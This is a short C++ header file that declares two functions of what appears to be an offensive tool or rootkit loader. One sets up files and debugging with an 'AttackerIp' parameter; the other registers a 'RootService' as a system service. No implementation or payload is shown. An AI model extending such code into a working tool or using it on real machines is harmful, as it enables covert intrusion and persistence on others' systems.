#pragma once
#include <iostream>
#include "utils.h"
#include "services.h"

BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey);
BOOL SignAsService(char* ServicePath, RootService* ServiceObject, const char* ServiceName, DWORD ServiceType, DWORD ServiceStart, DWORD ErrorControl, const char* ServiceExt);